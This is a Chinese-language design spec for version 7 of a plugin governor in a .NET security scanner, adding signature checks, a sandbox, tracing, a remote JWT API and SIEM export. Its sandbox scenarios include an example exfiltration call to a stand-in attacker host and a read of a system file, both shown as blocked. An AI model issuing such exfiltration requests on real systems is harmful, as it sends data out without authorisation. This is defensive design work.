# 插件管控器 v7 Spec（在 v6 基础上的增强版）

## Why
v6 已实现插件管控器的基础闭环（安全治理 / 版本与依赖 / 健康监控 / 调度与告警），但落地到真实生产环境仍存在明显缺口：

- **可信来源**：v6 没有签名校验，黑客替换 DLL 后可直接加载，无任何告警
- **隔离不足**：恶意/异常插件可以自由读写文件系统、访问网络、修改注册表，仅靠"权限矩阵"做"软约束"
- **运维可视化差**：管控中心全是表格，没有实时大屏和图表，运维要凭经验判断
- **远程管理缺失**：管理员必须本机操作，无法远程批量管控多套部署
- **故障定位难**：插件调用链没有 trace ID，跨插件/跨阶段卡死时找不到瓶颈
- **权限申请流程不闭环**：插件需要新权限时只能改代码，缺少正式审批流
- **告警规则全靠手写**：90% 场景其实是模板化的（连续失败/超时/内存/健康度），缺少一键启用的预设
- **审计日志难以复用**：JSON Lines 文件只能事后翻文本，没法和 ELK / SIEM 对接

v7 在 v6 平级扩展 6 个**新能力**模块 + 1 个**升级**模块，不破坏 v6 现有 API。

## What Changes

### 新增模块
- **NEW `PluginSignatureService`**：插件 DLL 的数字签名校验（RSA + SHA-256 + 公钥白名单），加载前必过
- **NEW `PluginSandboxService`**：基于 .NET 6 `AssemblyLoadContext` + 反射拦截的轻量沙箱，限制 FileSystem/Network/Registry/Process 访问
- **NEW `PluginTelemetryService`**：调用链追踪（TraceId/SpanId 贯穿 Scan→Plugin→Sub-call），写入 `data/plugin_traces/{yyyyMMdd}.jsonl`
- **NEW `RemoteGovernorApiService`**：本地 HTTP 监听（默认 `127.0.0.1:9530`）+ JWT 鉴权，提供 REST API 给远程管控台调用
- **NEW `PermissionRequestService`**：插件动态申请权限的工作流（提交→管理员审批→生效→审计）
- **NEW `AlertTemplateService`**：告警规则模板（连续失败/超时/内存/健康度/调用链异常等 8+ 预设），一键启用

### 升级模块
- **UPGRADE `PluginGovernorWindow`**：新增"🩺 运行时大屏"Tab（健康度/内存/CPU 实时折线图 + 隔离事件流）
- **UPGRADE `PluginSecurityService`**：审计日志支持导出 CSV / 上传 SIEM（SYSLOG/JSON over HTTP）
- **UPGRADE `PluginHealthMonitor`**：增加调用链超时检测、CPU 真实采样（Process.TotalProcessorTime）

**BREAKING**：
- v7 起**所有插件加载强制走签名校验**，未签名或签名不在白名单内的 DLL 一律拒绝（可在 `PluginPolicy.json` 里临时关掉 `RequireSignature` 开关，但默认开启）
- `PluginHotLoader.Enable()` 签名失败抛 `PluginSignatureException`
- 远程 API 默认绑定 `127.0.0.1`，若需对外暴露需显式配置 `RemoteGovernorApiService.BindAddress=0.0.0.0` 并设置强 JWT 密钥

## Impact
- Affected specs:
  - `enhance-plugin-governor-v6`（不变，平级扩展）
  - `enhance-plugin-orchestrator-v5`（Orchestrator 增加 TraceId 透传）
  - `enhance-plugin-manager`（HotLoader 集成签名校验）
- Affected code:
  - `NetSecurityScanner.Core/Services/PluginSignatureService.cs`（新）
  - `NetSecurityScanner.Core/Services/PluginSandboxService.cs`（新）
  - `NetSecurityScanner.Core/Services/PluginTelemetryService.cs`（新）
  - `NetSecurityScanner.Core/Services/RemoteGovernorApiService.cs`（新）
  - `NetSecurityScanner.Core/Services/PermissionRequestService.cs`（新）
  - `NetSecurityScanner.Core/Services/AlertTemplateService.cs`（新）
  - `NetSecurityScanner.Core/Models/PluginSignature.cs`（新）
  - `NetSecurityScanner.Core/Models/SandboxPolicy.cs`（新）
  - `NetSecurityScanner.Core/Models/TraceSpan.cs`（新）
  - `NetSecurityScanner.Core/Models/PermissionRequest.cs`（新）
  - `NetSecurityScanner.Core/Models/AlertTemplate.cs`（新）
  - `NetSecurityScanner.Core/Models/PluginExceptions.cs`（加 `PluginSignatureException`）
  - `NetSecurityScanner.Core/Plugins/PluginHotLoader.cs`（改造：签名校验 + 沙箱包装）
  - `NetSecurityScanner.Core/Plugins/PluginManager.cs`（改造：埋点 TraceId + 申请权限）
  - `NetSecurityScanner.Core/Services/PluginHealthMonitor.cs`（升级：真实 CPU 采样 + 调用链超时）
  - `NetSecurityScanner.Core/Services/PluginSecurityService.cs`（升级：审计导出 CSV / 推 SIEM）
  - `NetSecurityScanner.Core/Services/PluginGovernor.cs`（升级：聚合 6 个新子服务）
  - `NetSecurityScanner.Desktop/Views/Views/PluginGovernorWindow.xaml(.cs)`（升级：新增"🩺 运行时大屏"Tab）
  - `NetSecurityScanner.Desktop/Views/Views/RemoteGovernorConsoleWindow.xaml(.cs)`（新：远程管控台简易 UI）
  - `NetSecurityScanner.Desktop/Views/Views/PermissionRequestDialog.xaml(.cs)`（新：权限申请审批对话框）

## ADDED Requirements

### Requirement: 插件签名校验（可信来源）
`PluginSignatureService`：
- 加载 DLL 时读取同目录 `.sig` 文件（base64 编码的 RSA-SHA256 签名）
- 用 `PluginPolicy.TrustedPublicKeys` 中的公钥验签
- 验签失败抛 `PluginSignatureException`，并写审计 `SignatureInvalid`

#### Scenario: 加载未签名插件
- **WHEN** `PluginHotLoader.Enable(path, plugin)` 触发
- **AND** 策略 `RequireSignature=true`
- **AND** 插件目录无 `.sig` 文件或签名不在白名单
- **THEN** 抛 `PluginSignatureException("插件 {id} 签名校验失败")`
- **AND** 审计日志记录 `SignatureInvalid` + SHA-256 指纹
- **AND** 管控中心"安全治理"页红色横幅提醒

#### Scenario: 签名通过
- **WHEN** DLL 的 `.sig` 文件能用白名单中的某公钥验签
- **THEN** 加载流程继续到沙箱检查
- **AND** 审计日志记录 `SignatureOK` + 签名人 + 时间戳

#### Scenario: 临时关闭签名
- **WHEN** 管理员在 `PluginPolicy.json` 把 `RequireSignature=false`（仅限可信环境）
- **THEN** 跳过签名校验（但仍走沙箱 + 审计）

### Requirement: 插件沙箱（隔离危险操作）
`PluginSandboxService`：
- 通过 .NET 6 `AssemblyLoadContext` + 动态代理拦截插件对 `File`/`HttpClient`/`Registry`/`Process` 的访问
- `SandboxPolicy` 定义允许的目录白名单 / 允许的网络出口白名单 / 允许的进程名白名单
- 违规调用抛 `SandboxViolationException` + 审计

#### Scenario: 越界读文件
- **WHEN** 插件调用 `File.ReadAllText("C:\\Windows\\System32\\drivers\\etc\\hosts")`
- **AND** 沙箱 `AllowedPaths` 不含此路径
- **THEN** 抛 `SandboxViolationException("文件越界: C:\\Windows\\...")`
- **AND** 当前插件执行被取消 + 审计 `SandboxViolation`

#### Scenario: 未授权网络出口
- **WHEN** 插件调用 `HttpClient.GetAsync("https://attacker.com/exfil")`
- **AND** 沙箱 `AllowedNetworkTargets` 不含 `attacker.com`
- **THEN** 请求被拦截，抛 `SandboxViolationException`

#### Scenario: 合规调用
- **WHEN** 插件读 `Plugins/{id}/data/` 下的文件
- **THEN** 路径在白名单中 → 放行

### Requirement: 调用链追踪（Trace / Span）
`PluginTelemetryService`：
- 每次扫描请求生成 TraceId + 每个插件执行生成 SpanId
- Span 记录：开始时间 / 结束时间 / 父 SpanId / 阶段（Scan → Plugin.ScanAsync → SubCall）/ 状态 / 标签
- 写入 `data/plugin_traces/{yyyyMMdd}.jsonl`（JSON Lines）
- 支持按 TraceId 反查完整链路

#### Scenario: 单次扫描全链路
- **WHEN** 扫描任务 `ScanTargetAsync(192.168.1.10)` 触发
- **THEN** 生成 TraceId=`abc123`
- **AND** 包含 3 个 Span（Orchestrator / Plugin A.ScanAsync / Plugin B.ScanAsync）
- **AND** 每个 Span 记录耗时 + 父 SpanId

#### Scenario: 调用链超时
- **WHEN** 某 Span 超过 30 秒（可在 AlertTemplate 配）
- **THEN** 健康监控扣 10 分 + 触发"调用链超时"告警
- **AND** 告警内容包含 TraceId，可一键跳到链路详情

#### Scenario: 链路查询
- **WHEN** 管理员在管控中心输入 TraceId 查询
- **THEN** 返回完整调用树（TreeView）+ 每个 Span 的耗时/标签

### Requirement: 远程管控 API（REST + JWT）
`RemoteGovernorApiService`：
- 内置 Kestrel 监听（默认 `127.0.0.1:9530`，避免暴露公网）
- JWT Bearer 鉴权（HS256，密钥来自 `PluginPolicy.RemoteApiJwtSecret`）
- 暴露接口：
  - `GET /api/v7/plugins` 列出插件
  - `GET /api/v7/governor/status` 健康/待更新/隔离/任务数
  - `POST /api/v7/security/policy` 修改策略（写入审计）
  - `POST /api/v7/plugins/{id}/quarantine` 隔离
  - `POST /api/v7/plugins/{id}/release` 解除隔离
  - `GET /api/v7/traces/{traceId}` 查询调用链
  - `GET /api/v7/alerts/recent?limit=50` 最近告警

#### Scenario: 远程获取状态
- **WHEN** 带有效 JWT 的 GET `/api/v7/governor/status`
- **THEN** 返回 JSON `{health: 87, pendingUpdates: 3, quarantined: 1, scheduledTasks: 5}`

#### Scenario: 越权访问
- **WHEN** 无 JWT 或 JWT 过期
- **THEN** 返回 401 + 审计 `RemoteApiUnauthorized`

#### Scenario: 远程隔离插件
- **WHEN** 带 admin JWT 的 POST `/api/v7/plugins/{id}/quarantine`
- **THEN** 调用 `HealthMonitor.Quarantine(id, "远程API")` + 审计 + 通知

#### Scenario: 远程管控台
- **WHEN** 管理员打开 `RemoteGovernorConsoleWindow`
- **THEN** 显示当前主机的 API URL + 生成的临时 JWT（一键复制）
- **AND** 内置"打开浏览器查看"按钮

### Requirement: 权限申请工作流
`PermissionRequestService`：
- 插件运行时通过 `RequestPermissionAsync(pluginId, perm, reason)` 提交申请
- 申请进入"待审批"列表（持久化到 `data/permission_requests.json`）
- 管理员在管控中心"权限审批"Tab 处理（通过/拒绝 + 备注）
- 通过后权限自动写入 `PluginPolicy.PermissionMatrix` + 审计

#### Scenario: 插件申请新权限
- **WHEN** 插件需要 `ReadRegistry` 但不在权限矩阵中
- **THEN** 弹 `PermissionRequestDialog` 提示管理员（前台时）
- **AND** 写入待审批列表
- **AND** 审计 `PermissionRequested`

#### Scenario: 管理员批准
- **WHEN** 管理员点击"批准" + 备注"临时使用 24h"
- **THEN** `PluginPolicy.PermissionMatrix[pluginId].Add("ReadRegistry")`
- **AND** 写审计 `PermissionGranted` + 备注

#### Scenario: 管理员拒绝
- **WHEN** 管理员点击"拒绝" + 备注"无需此权限"
- **THEN** 申请标记 `Rejected`
- **AND** 后续插件再次调用相同权限直接拒绝

### Requirement: 告警规则模板（一键启用）
`AlertTemplateService`：
- 内置 8 个常用模板：
  1. `ConsecutiveFailure` - 5 分钟内连续 3 次失败
  2. `MemoryLimit` - 单次执行内存 > 200MB
  3. `Timeout` - 单次执行 > 60 秒
  4. `HealthBelowThreshold` - 健康度 < 60
  5. `SignatureInvalid` - 签名校验失败
  6. `SandboxViolation` - 沙箱违规
  7. `TraceTimeout` - 调用链单 Span > 30 秒
  8. `UnauthorizedRemoteApi` - 远程 API 越权
- 每个模板预填：触发条件 / 默认阈值 / 推荐通知渠道 / 描述
- 管理员可一键"启用"→ 自动创建 `AlertRule`

#### Scenario: 一键启用"内存超限"
- **WHEN** 管理员在"告警模板"页签点"启用" `MemoryLimit`
- **THEN** 创建 `AlertRule { Name="MemoryLimit", ThresholdMB=200, Channels=[Tray, Log] }`
- **AND** 写审计 `AlertTemplateEnabled`
- **AND** 即时生效

#### Scenario: 自定义阈值
- **WHEN** 管理员在模板基础上修改阈值为 150MB
- **THEN** 保存为"自定义规则"（不再跟随模板更新）

### Requirement: 运行时大屏（实时可视化）
`PluginGovernorWindow` 新增"🩺 运行时大屏"Tab：
- 顶部 4 个 KPI 卡片：平均健康度 / 待更新数 / 隔离数 / 调度任务数（5 秒刷新）
- 中部实时折线图（LiveCharts2）：
  - 健康度趋势（最近 5 分钟）
  - 内存使用趋势（聚合）
  - 调用链平均耗时趋势
- 下部事件流：实时滚动的告警 / 隔离 / 签名失败 事件（最近 100 条）

#### Scenario: 进入大屏
- **WHEN** 管理员切换到"🩺 运行时大屏"Tab
- **THEN** KPI 卡片 5 秒自动刷新
- **AND** 折线图每 5 秒追加新点
- **AND** 事件流按时间倒序显示

#### Scenario: 大屏告警联动
- **WHEN** 事件流出现"插件 X 连续失败 3 次"
- **THEN** 点击事件行 → 跳到该插件的健康详情
- **AND** 顶部 KPI 卡片"隔离数"自动 +1

### Requirement: 审计日志导出与 SIEM 上传
`PluginSecurityService` 升级：
- 新增 `ExportAuditCsvAsync(startDate, endDate, outputPath)` 导出指定日期范围的审计为 CSV（含 BOM，Excel 友好）
- 新增 `ConfigureSiemUploadAsync(config)` 配置 SIEM 推送（支持 SYSLOG-UDP / HTTP-JSON）

#### Scenario: 导出 7 天审计
- **WHEN** 管理员点"导出审计" → 选日期范围 2026-07-06 ~ 2026-07-12
- **THEN** 合并 7 个 JSON Lines 文件为单一 CSV
- **AND** 写入 `data/audit_exports/audit_20260706_20260712.csv`

#### Scenario: 推送 ELK
- **WHEN** 配置 `SiemEndpoint=http://elk.local:9200/_bulk` + APIKey
- **THEN** 每条审计实时推送到 ELK（失败重试 3 次 + 写本地 dead-letter 文件）

## MODIFIED Requirements
（v6 原有规则保持兼容，以下为 v7 增强）

### Requirement: 插件加载流程升级（v7：签名 → 沙箱 → 权限）
`PluginHotLoader.Enable(path, plugin)` 加载顺序升级为：
1. 签名校验（`PluginSignatureService.Verify`）
2. 沙箱检查（`PluginSandboxService.Wrap`）
3. 权限校验（`PluginSecurityService.IsAllowed` + `EnforcePermission`）
任一步骤失败 → 拒绝 + 审计 + 抛出对应异常

### Requirement: 健康监控升级（v7：真实 CPU + 调用链超时）
`PluginHealthMonitor` 升级：
- CPU 采样从估算改为 `Process.TotalProcessorTime` 真实值（5 秒采样）
- 新增 `OnTraceTimeout` 事件：调用链 Span > 30 秒时触发
- 隔离前增加"冷却期"（5 分钟后再评估，避免抖动）

### Requirement: 审计写入升级（v7：本地 + SIEM 双写）
`PluginSecurityService.AppendAuditAsync` 升级：
- 写入本地 JSON Lines 后，异步推送到已配置的 SIEM Endpoint
- 失败时写 dead-letter：`data/plugin_audit/dead_letter/{yyyyMMdd}.jsonl`
- 每 30 秒批量重试 dead-letter

## REMOVED Requirements
无（v6 全部保留并兼容）
